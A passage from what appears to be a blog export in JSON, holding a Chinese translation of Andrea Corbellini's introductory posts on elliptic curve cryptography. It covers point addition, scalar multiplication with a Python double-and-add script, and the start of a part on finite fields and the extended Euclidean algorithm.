2^0\n\\end{array}\n    $$\n    (将n转换成二进制并表示为多个2的指数次之和)\n    通过上面的表达式, 我们可以写出: \n    $$\n    151 \\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\n    $$\n    倍加法的具体实现步骤如下:\n    <ul>\n        <li> 找到点 P </li>\n        <li> 翻倍, 得到 2P </li>\n        <li> 用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) </li>\n        <li> 2P 翻倍, 得到 2^2P </li>\n        <li> 将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) </li>\n        <li> $2^2P$ 翻倍得到 $2^3P$ </li>\n        <li> 别加$2^3P$ </li>\n        <li> $2^3P$ 翻倍得到 $2^4P$ </li>\n        <li> 加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) </li>\n        <li> ... </li>\n    </ul>\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个 Python脚本实现了这个算法\n</p><!--kg-card-end: html--><!--kg-card-begin: markdown--><pre><code class=\"language-python\">def bits(n):\n    &quot;&quot;&quot;\n    Generates the binary digits of n, starting\n    from the least significant bit.\n\n    bits(151) -&gt; 1, 1, 1, 0, 1, 0, 0, 1\n    &quot;&quot;&quot;\n    while n:\n        yield n &amp; 1\n        n &gt;&gt;= 1\n\ndef double_and_add(n, x):\n    &quot;&quot;&quot;\n    Returns the result of n * x, computed using\n    the double and add algorithm.\n    &quot;&quot;&quot;\n    result = 0\n    addend = x\n\n    for bit in bits(n):\n        if bit == 1:\n            result += addend\n        addend *= 2\n\n    return result\n</code></pre>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了. 至少比最开始复杂度为 $O(n)$ 的算法要好得多!\n</p><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">对数</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? <strong>如果我们已知 Q 和 P 想要找出 n 呢.?</strong> 这个就是所谓的 <strong>对数难题.</strong> 我们把这个问题称作\"对数\"而不是\"除法\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\n</p>\n\n<p>\n    我没听说过任何\"简单\"的算法可以用于解决对数难题, 不过通过<a href=\"https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1\">尝试乘法</a>倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n 是一个奇数时,  $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验, 我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\n</p>\n\n<p>\n    不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, <strong>计算标量乘法仍然是\"容易的\", 不过求解离散对数将会成为一个\"十分困难\"的问题.</strong> 这个特性将成为椭圆曲线密码学的关键.\n</p><!--kg-card-end: html--><!--kg-card-begin: markdown--><h1 id=\"\">未完待续</h1>\n<!--kg-card-end: markdown--><!--kg-card-begin: html--><p>\n    这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 <strong>有限域</strong> 以及 <strong>离散对数难题</strong>. 如果这些内容听起来还不错, 那么就敬请期待吧!\n</p><!--kg-card-end: html-->","comment_id":"5dfc7ca42ee0ee000181900e","plaintext":"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第一篇, 原文采用 CC-BY 4.0 协议\n[https://creativecommons.org/licenses/by/4.0/deed.zh]  进行授权\n原文链接 : \nhttps://andrea.corbellini.name/2015/05/17/elliptic-curve-cryptography-a-gentle-introduction/\n原作者: ANDREA CORBELLINI [https://andrea.corbellini.name/]\n译者: chxj1992 [http://blog.chxj.name/]\n\n\n如果你们知道什么是椭圆曲线密码学, 那你们应该也听说过 ECC, ECD或者ECDSA. ECC是椭圆曲线密码学(Elliptic Curve\nCryptography)的首字母缩写, 而另外两个都是基于ECC实现的算法.\n\n如今, 我们在 TLS [https://tools.ietf.org/html/rfc4492], PGP\n[https://tools.ietf.org/html/rfc6637]  和 SSH\n[https://tools.ietf.org/html/rfc5656]  里都能找到椭圆曲线密码学的身影, 这三种技术可以说是现代互联网和数字世界的基础,\n更别提ECC在比特币 [https://en.bitcoin.it/wiki/Secp256k1]和其他各种加密货币中发挥的巨大作用了.\n\n在ECC开始流行以前, 绝大多数公钥加密算法都基于 RSA, DSA 和 DH 实现. 和ECC一样, RSA等如今仍然发挥着重要的作用.\nRSA等算法由于其相对容易解释的原理和可以轻松实现的简化模型\n[http://code.activestate.com/recipes/578838-rsa-a-simple-and-easy-to-read-implementation/]\n, 让很多人都能大概理解RSA是怎么一回事. 而对其中大多数人来说, ECC的实现原理却仍是个谜.\n\n希望通过这一系列的文章我能将你带入椭圆曲线密码学的世界. 我的目标并不是提供一份完整详尽的ECC指南(这样的资料在网上到处都能找到),\n而是通过尽量简单的方式说明 什么是ECC以及它为什么是安全的, 而不必在冗长的数学证明和枯燥的实现细节上花费太多的时间.另外,\n我还会提供一些交互式的可视化小工具和脚本来帮助你更好的理解内容.\n\n具体来说, 本系列文章将涉及以下内容:\n\n 1. 实数域上的椭圆曲线和群论\n    [http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/] \n     (本篇文章将会讨论)\n 2. 有限域上的椭圆曲线和离散对数难题\n    [http://blog.chxj.name/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh]\n 3. 秘钥对的生成及两种ECC算法: ECDH和ECDSA\n    [http://blog.chxj.name/elliptic-curve-cryptography-ecdh-and-ecdsa-zh]\n 4. ECC破解算法和与RSA的对比\n    [http://blog.chxj.name/elliptic-curve-cryptography-breaking-security-and-a-comparison-with-rsa-zh]\n\n为了更好的理解我们将要讨论的内容, 你需要先学习一点关于集合论, 几何学和模运算的基础, 并熟悉关于对称性和非对称密码学相关的基础知识. 最后,\n你需要对什么是\"简单\"问题, 什么是\"复杂\"问题以及他们在密码学中锁扮演的角色有一个清晰的认识.\n\n椭圆曲线\n首先, 什么是椭圆曲线? Wolfram MathWorld [http://mathworld.wolfram.com/]  给出了一个超赞且完善的定义\n[http://mathworld.wolfram.com/EllipticCurve.html]. 但是考虑到本文目标,\n可以把椭圆曲线简单的理解成一个满足以下方程式的点的集合:\n\n$$y^2 = x^3 + ax + b$$且满足 $4a^3 + 27b^2 \\ne 0$ (以便排除奇点\n[https://zh.wikipedia.org/wiki/%E5%A5%87%E7%82%B9_(%E6%95%B0%E5%AD%A6)]).\n上面的方程被称为椭圆曲线的维尔斯特拉斯标准形式(Weierstrass normal form).\n不同椭圆曲线的形状 (b=1,  a 从 2 变到 -3).\n\n\n奇点的类型: 在左图曲线上存在一个尖锐点($y^2 = x^3$), 右图曲线发生了自交($y^2 = x^3 - 3x + 2$),\n它们都不是有效的椭圆曲线.根据a和b值的不同, 椭圆曲线可能在平面上呈现出不同的形状, 我们可以很容易的看出,椭圆曲线是关于x轴对称的.\n我们还需要一个无穷远处的点(也叫理想点)作为曲线的组成部分, 从现在起, 我们将用0(数字0)表示这个点.如果要显示的表现这个无穷远处的点,\n可以通过下面的方程来完善我们的定义:\n\n$$\\left\\{ (x, y) \\in \\mathbb{R}^2\\ |\\ y^2 = x^3 + ax + b,\\ 4 a^3 + 27 b^2 \\ne 0\n\\right\\}\\ \\cup\\ \\left\\{ 0 \\right\\}$$群\n\n数学上的群是指定义了一个用\"+\"表示的二元运算\"加法\"的集合. 为了让集合 $\\mathbb{G}$ 成为一个群,\n就必须先定义一个加法运算并且这个集合应该遵循以下四条特征:\n\n 1.   封闭性:  如果a和b都是 $\\mathbb{G}$ 中的元素, 那么 a+b 也应该是 $\\mathbb{G}$ 中的元素 \n 2.   结合律:  $(a + b) + c = a + (b + c)$\n 3.   存在单位元  0 满足 $a + 0 = 0 + a = a$ \n 4.   任何元素都有一个与之相对应的逆元, 比如: 任何元素a都存在一个b使之满足 $a + b = 0$\n\n如果我们再加上第五个条件:\n交换律:  $a + b = b + a$\n那么这个群就可以被称作阿贝尔群\n根据加法的一般概念, 整数集合 $\\mathbb{Z}$ 是一个群 (更准确的说, 是一个阿贝尔群). 而自然数集合就不是一个群, 因为它无法满足第四个特征.\n\n\n群很棒因为如果我们能证明以上四条特征是成立的, 那么我们就可以自动得到群的其他一些特征. 比如: 单位元是唯一的; 逆元也是唯一的, 意思是:\n对群中的任何元素a来说, 有且仅有b使 $a + b = 0$ 成立(也可以把b写成-a). 这些关于群的特性稍后将会直接或间接的发挥重要的作用.\n\n椭圆曲线上的群律\n\n我们可以在椭圆曲线上定义一个群, 具体来说:\n\n * \n   群里的元素是椭圆曲线上的点\n    \n * \n    单位元是指在无穷远处的点 0\n    \n * \n   点P的逆元是指其关于x轴对称的点\n    \n * \n    加法可以根据以下规则定义: 找到三个在一条线上非零的点P,Q和R, 他们之和满足 $P + Q + R = 0$\n    \n\n\n在一条直线上的三点之和为0\n\n\n\n注意最后一条规则, 我们只要求三个点位于一条直线上, 但是并没有要其顺序. 这意味着如果 P,Q和R在一条直线上, 则有 $P + (Q + R) = Q +\n(P + R) = R + (P + Q) = \\cdots = 0$. 这样, 我们有了一个直观的证明, 我们定义的加法运算也满足结合律和交换律,\n这是一个阿贝尔群.\n\n\n到目前为止, 一切都很顺利. 但我们到底应该如何计算任意两个点之和呢?\n\n几何意义上的加法运算\n\n还好这是一个阿贝尔群, 我们可以把 $P + Q + R = 0$ 写成 $P + Q = -R$. 借助这种形式的方程,\n我们可以推导出一种计算P和Q之和的几何方法: 过点P,Q画一条直线, 这条直线将和曲线相交于第三个点R(这意味着P,Q和R位于一条直线上). 点R的逆元-R正是\n$P + Q$ 的结果.\n\n\n过 P 和 Q 画一条直线交于第三点 R, 关于x轴与之对称的点 -R 即为 P+Q 之和.\n\n\n\n如果再做一些细化, 这个几何式的方法是行得通的. 具体来说, 我们需要回答以下几个问题: \n\n  *   当 P = 0 且 Q = 0 时会怎么样?  显然我们没法画出这样的直线(因为0根本不在xy平面上), 但是根据我们对单位元 0 的定义, $P +\n   0 = P$ 和 $0 + Q = Q$ 对任何 P 和 Q 都成立\n *   当 P = -Q 时会怎么样?  在这种情况下, 穿过两点的直线将与x轴垂直且不与其他任何点相交. 但当 P 是 Q 的逆元, 根据逆元的定义则有\n   $P + Q = P + (-P) = 0$ \n *   当 P = Q 时会怎么样?  在这种情况下, 过这个点可以作出无穷多条直线. 这里问题就开始变得有点复杂了. 首先考虑当 $Q' \\ne P$,\n   而让 Q' 逐渐接近 P 时会发生什么? \n\n\n\n\n当两点逐渐靠近, 过这两个点的直线将变成曲线的一条切线\n\n\n当 Q' 朝着 P 移动时, 穿过 P 和 Q' 的直线将变为曲线的一条切线. 据此我们可以得出解决 $P + P = -R$, R 是 P\n点在曲线上的切线与曲线的交点.\n  *   如果 $P \\ne Q$, 而又不存在第三个点 R 呢?  这种情况和前一种很类似, 事实上这就是一条线经过了 P 和曲线上的一个切点 Q 的情况 \n\n\n\n\n如果直线与曲线只相交于两点, 这表明这条线与曲线相切. \n很容易就能看出两点之和为切点关于x轴的对称点.\n\n\n\n\n\n假设 P 是曲线上的切点, 在前一种情况下我们用 $P + P = -Q$ 表示, 这个方程也可以写成 $P + Q = -P$. 换句话说, 现在如果 Q\n是曲线上的切点, 那么上面的等式就变成了 $Q + P = -Q$.\n\n\n现在, 几何式的方法已经可以覆盖所有的场景了, 只需要一支铅笔和一把尺子我们就能计算出如何椭圆曲线上两个点的和. 如果你有兴趣的话, \n也可以看看我做的这个计算椭圆曲线加法的 HTML5/JavaScript版可视化工具\n[https://andrea.corbellini.name/ecc/interactive/reals-add.html]  !\n\n代数意义上的加法运算\n\n如果你想用计算机来算两点之和, 我们就需要将几何式的求解方法转换成代数式的方法. 把上面的求解方法翻译成一系列的方程看起来很容易,\n但是因为需要求解三次方程实际上也比较枯燥. 所以在这里我会直接给出结果.\n\n\n译者注: \n椭圆曲线加法方程的代数方法推导在  Promgramming BitCoin 的第二章  [https://github.com/jimmysong/programmingbitcoin/blob/master/ch02.asciidoc#coding-point-addition]  \n中给出了详细的演算过程, 有兴趣的同学可以前往阅读 \n\n\n\n首先, 我们先排除各种麻烦的边界情况. 我们已经知道 $P + (-P) = 0$, 我们也知道 $P + 0 = 0 + P = P$,\n所以在我们的方程式里我们会排除这两种情况, 我们只用考虑 两个非零点, 以及非对称点 $P = (x_P, y_P)$ 和 $Q = (x_Q, y_Q)$. \n\n\n如果 P 和 Q 不相等 ($x_P \\ne x_Q$), 则过两点的直线的斜率为:\n$$ m = \\frac{y_P - y_Q}{x_P - x_Q} $$ \n这条直线与椭圆曲线的交点 $R = (x_R, y_R)$ 有:\n$$ \n\\begin{array}{rcl}\nx_R & = & m^2 - x_P - x_Q \\\\\ny_R & = & y_P + m(x_R - x_P)\n\t\\end{array} \n$$\n或者写成: \n$$ y_R = y_Q + m(x_R - x_Q) $$\n则有 $(x_P, y_P) + (x_Q, y_Q) = (x_R, -y_R)$ (注意等式中的符号并始终牢记公式 $P + Q = -R$)\n\n\n如果想要验证结果的正确性, 我们需要检查 R 是否是曲线上的一个点, 以及 P, R 和 Q 是否在一条直线上. 验证 P, R 和 Q 在一条直线上很容易,\n但是检查 R 是否是曲线上的一点就没那么容易了, 因为这又需要求解三次方程, 会比较麻烦\n\n\n作为替代方案, 我们可以用一个可视化工具\n[https://andrea.corbellini.name/ecc/interactive/reals-add.html]通过一个例子来说明. 现在有 $P\n= (1, 2)$ , $Q = (3, 4)$ 在曲线 $y^2 = x^3 - 7x + 10$ 上, 这两点之和为 $P + Q = -R = (-3,\n2)$. 我们来看看带入方程是否成立: \n$$\n\\begin{array}{rcl}\nm & = & \\frac{y_P - y_Q}{x_P - x_Q} = \\frac{2 - 4}{1 - 3} = 1 \\\\\nx_R & = & m^2 - x_P - x_Q = 1^2 - 1 - 3 = -3 \\\\\ny_R & = & y_P + m(x_R - x_P) = 2 + 1 \\cdot (-3 - 1) = -2 \\\\\n& = & y_Q + m(x_R - x_Q) = 4 + 1 \\cdot (-3 - 3) = -2\n\\end{array}\n$$\n很好, 结果是正确的!\n\n\n注意, 上面的方程在 P 或者 Q 是曲线上的切点时仍然是成立的. 让我们再试试 $P = (-1, 4)$ , $Q = (1, 2)$ 的情况.\n$$\n\\begin{array}{rcl}\nm & = & \\frac{y_P - y_Q}{x_P - x_Q} = \\frac{4 - 2}{-1 - 1} = -1 \\\\\nx_R & = & m^2 - x_P - x_Q = (-1)^2 - (-1) - 1 = 1 \\\\\ny_R & = & y_P + m(x_R - x_P) = 4 + -1 \\cdot (1 - (-1)) = 2\n\\end{array}\n$$\n我们得出 $P + Q = (1, -2)$, 这个结果和用可视化工具\n[https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=-1&py=4&qx=1&qy=2]\n算出的结果是一样的\n\n\n当 $P = Q$ 时, 处理起来会有点区别: 求 $x_R$ 和 $y_R$ 的方程是一样的, 不过由于 $x_P = x_Q$, 我们需要用不同的方程来计算\n斜率:\n$$ m = \\frac{3 x_P^2 + a}{2 y_P} $$\n正如我们所料, m 的表达式是如下方程的一阶导数: \n$$ y_P = \\pm \\sqrt{x_P^3 + ax_P + b} $$\n检查 R 点位于椭圆曲线上且穿过 P, R 两点的直线与曲线有且仅有两个交点就能证明结果的正确性, 但和前面一样, 我们还是通过一个例子来验证, 当 P = Q\n= (1, 2) 时\n$$\n\\begin{array}{rcl}\nm & = & \\frac{3x_P^2 + a}{2 y_P} = \\frac{3 \\cdot 1^2 - 7}{2 \\cdot 2} = -1 \\\\\nx_R & = & m^2 - x_P - x_Q = (-1)^2 - 1 - 1 = -1 \\\\\ny_R & = & y_P + m(x_R - x_P) = 2 + (-1) \\cdot (-1 - 1) = 4\n\\end{array}\n$$\n可以得出 $P + P = -R = (-1, -4)$, 结果是正确的!\n[https://andrea.corbellini.name/ecc/interactive/reals-add.html?px=1&py=2&qx=1&qy=2]\n\n标量乘法\n\n\t除加法外, 我们还可以定义另一种运算: 标量乘法, 如下: \n$$ \nnP = \\underbrace{P + P + \\cdots + P}_{n\\ \\text{times}}\n$$\n\t这里的 n 是一个自然数. 我也做了一个计算标量乘法的可视化工具\n[https://andrea.corbellini.name/ecc/interactive/reals-mul.html], 有兴趣的话可以看看.\n\n\n写成上面的形式, 看起来计算 nP 需要进行 n 次加法. 当 n 是一个k位(二进制)的数字, 我们的算法复杂度将会是 $O(2^k)$, 这太差了.\n但实际上我们可以有更快的算法.\n\n\n其中一种叫做倍加法(double and add algorithm). 通过一个例子我们可以更好地解释它的原理. 当 n = 151, 表示为二进制\n$10010111_2$, 借助其二进制形式我们可以用以下表达式来表示:\n$$\n\\begin{array}{rcl}\n151 & = & 1 \\cdot 2^7 + 0 \\cdot 2^6 + 0 \\cdot 2^5 + 1 \\cdot 2^4 + 0 \\cdot 2^3 +\n1 \\cdot 2^2 + 1 \\cdot 2^1 + 1 \\cdot 2^0 \\\\\n& = & 2^7 + 2^4 + 2^2 + 2^1 + 2^0\n\\end{array}\n$$\n(将n转换成二进制并表示为多个2的指数次之和)\n通过上面的表达式, 我们可以写出: \n$$\n151 \\cdot P = 2^7 P + 2^4 P + 2^2 P + 2^1 P + 2^0 P\n$$\n倍加法的具体实现步骤如下:\n  *   找到点 P \n *   翻倍, 得到 2P \n *   用 2P 加 P (得到 $2^1P + 2^0P$ 的结果) \n *   2P 翻倍, 得到 2^2P \n *   将其加入之前的结果中 (得到 $2^2P + 2^1P + 2^0P$ 的结果) \n *   $2^2P$ 翻倍得到 $2^3P$ \n *   别加$2^3P$ \n *   $2^3P$ 翻倍得到 $2^4P$ \n *   加入之前的结果(得到 $2^4P + 2^2P + 2^1P + 2^0P$) \n *   ... \n\n最后, 只需要通过7次翻倍(自己加自己)和4次累加就可以计算出 $151 \\cdot P$ 的结果. 要是还说得不够清楚, 这里有一个\nPython脚本实现了这个算法\n\ndef bits(n):\n    \"\"\"\n    Generates the binary digits of n, starting\n    from the least significant bit.\n\n    bits(151) -> 1, 1, 1, 0, 1, 0, 0, 1\n    \"\"\"\n    while n:\n        yield n & 1\n        n >>= 1\n\ndef double_and_add(n, x):\n    \"\"\"\n    Returns the result of n * x, computed using\n    the double and add algorithm.\n    \"\"\"\n    result = 0\n    addend = x\n\n    for bit in bits(n):\n        if bit == 1:\n            result += addend\n        addend *= 2\n\n    return result\n\n\n\n因为翻倍和叠加都是 $O(1)$ 复杂度的运算, 那么这个算法的复杂度就是 $O(\\log n)$ (或者说 $O(k)$, k是数字的位长), 这样就挺好了.\n至少比最开始复杂度为 $O(n)$ 的算法要好得多!\n\n对数\n\n已知 n 和 P, 现在我们至少有一种方法可以在多项式时间算法可以算出 $Q = nP$. 但是如果反过来会怎么样? 如果我们已知 Q 和 P 想要找出 n\n呢.?  这个就是所谓的 对数难题. \n我们把这个问题称作\"对数\"而不是\"除法\"主要是为了和其他密码学系统在概念上保持一致(在其他密码学系统中一般用指数而不是乘法).\n\n\n我没听说过任何\"简单\"的算法可以用于解决对数难题, 不过通过尝试乘法\n[https://andrea.corbellini.name/ecc/interactive/reals-mul.html?a=-3&b=1&px=0&py=1]\n倒是可以找到一些规律. 比如, 已知曲线 $y^2 = x^3 - 3x + 1$ 和点 $P = (0, 1)$, 我们可以立刻验证出, 当 n\n是一个奇数时, $nP$ 会位于曲线的左侧平面, 如果 n 是一个偶数, $nP$ 会位于曲线的右侧平面. 如果我们做更多实验,\n我们也许能够找出更多这样的规律, 也许可以帮助我们找到高效计算椭圆曲线上对数难题的方法.\n\n\n不过对数难题还有一个变体: 离散对数难题. 在下一篇文章里我们将会看到, 如果我们缩小椭圆曲线的域, 计算标量乘法仍然是\"容易的\",\n不过求解离散对数将会成为一个\"十分困难\"的问题.  这个特性将成为椭圆曲线密码学的关键.\n\n未完待续\n\n这就是今天的全部内容, 希望你能喜欢这篇博客! 下周我们将会通过一些例子和小工具探索 有限域  以及 离散对数难题. 如果这些内容听起来还不错,\n那么就敬请期待吧!","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2019-12-20 07:47:48","updated_at":"2019-12-24 02:26:03","published_at":"2019-12-23 07:04:43","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null,"canonical_url":null},{"id":"5e0067842ee0ee000181987b","uuid":"c829385f-e2fb-47dd-a9cb-a205d33d7e0e","title":"[译] 椭圆曲线密码学: 有限域和离散对数","slug":"elliptic-curve-cryptography-finite-fields-and-discrete-logarithms-zh","mobiledoc":"{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<script type=\\\"text/javascript\\\" async\\n  src=\\\"https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML\\\">\\n</script>\\n\\n<script type=\\\"text/x-mathjax-config\\\">\\n  MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$']]}});\\n</script>\"}],[\"markdown\",{\"markdown\":\"> 本文翻译自爱尔兰AWS工程师 ANDREA CORBELLINI 关于椭圆曲线密码学四篇博客中的第二篇, 原文采用 [CC-BY 4.0 协议](https://creativecommons.org/licenses/by/4.0/deed.zh) 进行授权\\n> 原文链接 : https://andrea.corbellini.name/2015/05/23/elliptic-curve-cryptography-finite-fields-and-discrete-logarithms/\\n> 原作者: [ANDREA CORBELLINI](https://andrea.corbellini.name/)\\n> 译者: [chxj1992](http://blog.chxj.name/)\"}],[\"markdown\",{\"markdown\":\"这篇文章是[椭圆曲线密码学:入门](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)系列文章的第二篇.\\n\\n在[前一篇文章](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/)中, 我们知道了如何在实数域上的椭圆曲线上定义一个群. 具体来说, 我们定义了[点加](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#group-law)的规则: 找到位于一条直线上的三个点, 三点之和为零($P + Q + R = 0$). 我们推导了求解点加的[几何方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#geometric-addition)与[代数方法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#algebraic-addition).\\n\\n我们还介绍了[标量乘法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#scalar-multiplication)($nP = P + P + \\\\cdots + P$) 并且我们找到了一种用于计算标量乘法的\\\"简单\\\"算法: [倍加法](http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#double-and-add).\\n\\n**现在我们将要把椭圆曲线限制在有限域**而非所有实数的集合上, 让我们来看看这会产生怎样的变化.\"}],[\"markdown\",{\"markdown\":\"# 以p为模的整数域\"}],[\"html\",{\"html\":\"<p>\\n  有限域, 首先, 是指一个包含有限个元素的集合. 整数对质数p取模的集合就是有限域的一个例子, 一般用 $\\\\mathbb{Z}/p$, $GF(p)$ 或者 $\\\\mathbb{F}_p$ 表示. 这里我们采用最后一种表示方法.\\n</p>\\n\\n<p>\\n  在域上存在二元运算: 加法(+)和乘法(·), 他们都满足封闭性, 结合律和交换律. 对这两种操作都存在一个唯一的单位元, 并且对每个元素都有且仅有一个逆元. 最后, 乘法还满足分配率: $x \\\\cdot (y + z) = x \\\\cdot y + x \\\\cdot z$\\n</p>\\n\\n<p>\\n  这个集合由<strong>从0到p-1之间的所有整数构成<strong>. 加法和乘法遵循模运算法则(也叫\\\"时钟运算\\\"). 这里有一些在 $\\\\mathbb{F}_{23}$ 上运算的例子:\\n    \\n  <ul>\\n    <li> 加法: $(18 + 9) \\\\bmod{23} = 4$ </li>\\n    <li> 减法: $(7 - 14) \\\\bmod{23} = 16$ </li>\\n    <li> 乘法: $4 \\\\cdot 7 \\\\bmod{23} = 5$ </li>\\n    <li> \\n        加法逆运算: $-5 \\\\bmod{23} = 18$ <br>\\n        推导: $(5 + (-5)) \\\\bmod{23} = (5 + 18) \\\\bmod{23} = 0$\\n    </li>\\n    <li> \\n        乘法逆运算: $9^{-1} \\\\bmod{23} = 18$ <br>\\n        推导: $9 \\\\cdot 9^{-1} \\\\bmod{23} = 9 \\\\cdot 18 \\\\bmod{23} = 1$\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注:\\n  根据费马小定理可知, $9^{22} \\\\bmod{23} = 1$,\\n  所以 $9^{-1} \\\\bmod{23} = 9^{-1+22} \\\\bmod{23} = 18$\\n  这样理解起来要更容易一些\\n</pre>\\n    </li>\\n  </ul>\\n</p>\\n    \\n<p>\\n  如果这些等式看起来很陌生那么你需要先了解一点关于模运算的基本知识, 可以看看 [Khan Academy的这篇教程](https://www.khanacademy.org/computing/computer-science/cryptography/modarithmetic/a/what-is-modular-arithmetic)\\n</p>\\n    \\n<p>\\n    正如我们所言, 以p为模的整数是一个域, 它具备上述所有的特征. 需要注意的是p必须是一个质数! 以4为模的整数不是一个域: 2没有乘法逆元(等式 $2 \\\\cdot x \\\\bmod{4} = 1$ 没有解)\\n</p>\"}],[\"markdown\",{\"markdown\":\"# 以p为模的除法运算\"}],[\"html\",{\"html\":\"<p>\\n  我们将会定义 $\\\\mathbb{F}_p$ 上的椭圆曲线, 但在那之前我们需要对 $\\\\mathbb{F}_p$ 上的 $x / y$ 表示什么意思有一个清晰的认识. 根据 $x / y = x \\\\cdot y^{-1}$, 或者简单的说, x 除以 y 等于 x 乘以 y 的乘法逆元. 这没什么好奇怪的, 不过它为我们提供了一种计算除法的基本方法: <strong> 找到这个数的乘法逆元再用计算乘法的方法在计算它 </strong>\\n</p>\\n\\n<p>\\n  借助<a href=\\\"https://zh.wikipedia.org/wiki/%E6%89%A9%E5%B1%95%E6%AC%A7%E5%87%A0%E9%87%8C%E5%BE%97%E7%AE%97%E6%B3%95\\\">扩展欧几里得算法</a>计算乘法逆元是比较\\\"容易\\\"完成, 在最坏的情况下, 算法的复杂度为 $O(\\\\log p)$ (或者按位长来算, $O(k)$).\\n  我们不会详细讲解扩展的欧几里得算法, 因为这不是本文要讨论的, 不过这里有一份Python版的实现代码:\\n</p>\\n\\n<pre style=\\\"font-size: 0.75em;color: #66645c;\\\">\\n译者注: \\n  扩展欧几里得算法 也叫 扩展的辗转相除法, \\n  该算法在译者的之前的博客 <a href=\\\"http://blog.chxj.name/understanding-rsa-algorithm/\\\">读跨越千年的RSA算法</a> 一文中曾有讲到, \\n  有兴趣的读者可以前往阅读\\n</pre>\"}],[\"markdown\",{\"markdown\":\"```python\\ndef extended_euclidean_algorithm(a, b):\\n    \\\"\\\"\\\"\\n    Returns a three-tuple (gcd, x, y) such that\\n    a * x + b * y == gcd, where gcd is the greatest\\n    common divisor of a and b.\\n\\n    This function implements the extended Euclidean\\n    algorithm and runs in O(log b) in the worst case.\\n    \\\"\\\"\\\"\\n    s, old_s = 0, 1\\n    t, old_t = 1, 0\\n    r, old_r = b, a\\n\\n    while r != 0:\\n        quotient = old_r // r\\n        old_r, r = r, old_r - quotient * r\\n        old_s, s = s, old_s - quotient * s\\n        old_t, t = t, old_t - quotient * t\\n\\n    return old_r, old_s, old_t\\n\\n\\ndef inverse_of(n, p):\\n    \\\"\\\"\\\"\\n    Returns the multiplicative inverse of\\n    n modulo p.\\n\\n    This function returns an integer m such that\\n    (n * m) % p == 1.\\n    \\\"\\\"\\\"\\n    gcd, x, y = extended_euclidean_algorithm(n, p)\\n    assert (n * x + p * y) % p == gcd\\n\\n    if gcd != 1:\\n        # Either n is 0, or p is not a prime number.\\n        raise ValueError(\\n            '{} has no multiplicative inverse '\\n            'modulo {}'.format(n, p))\\n    else:\\n        return x % p\\n```\"}],[\"html\",{\"html\":\"<h1> $\\\\mathbb{F}_p$ 上的椭圆曲线 </h1>\"}],[\"html\",{\"html\":\"<p>\\n    现在, 我们已经掌握了将椭圆曲线限定在 $\\\\mathbb{F}_p$ 上所需的全部要素, 这些点的集合, 按前<a href=\\\"http://blog.chxj.name/elliptic-curve-cryptography-a-gentle-introduction-zh/#elliptic-curves\\\">一篇文章</a>可以表示成: \\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in \\\\mathbb{R}^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 = x^3 + ax + b, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\ne 0\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    现在则应该写成:\\n    $$\\n    \\\\begin{array}{rcl}\\n  \\\\left\\\\{(x, y) \\\\in (\\\\mathbb{F}_p)^2 \\\\right. & \\\\left. | \\\\right. & \\\\left. y^2 \\\\equiv x^3 + ax + b \\\\pmod{p}, \\\\right. \\\\\\\\\\n  & & \\\\left. 4a^3 + 27b^2 \\\\not\\\\equiv 0 \\\\pmod{p}\\\\right\\\\}\\\\ \\\\cup\\\\ \\\\left\\\\{0\\\\right\\\\}\\n\\\\end{array}\\n    $$\\n    0 仍然是无穷远处的点, 而 a 和 b 是 $\\\\mathbb{F}_p$ 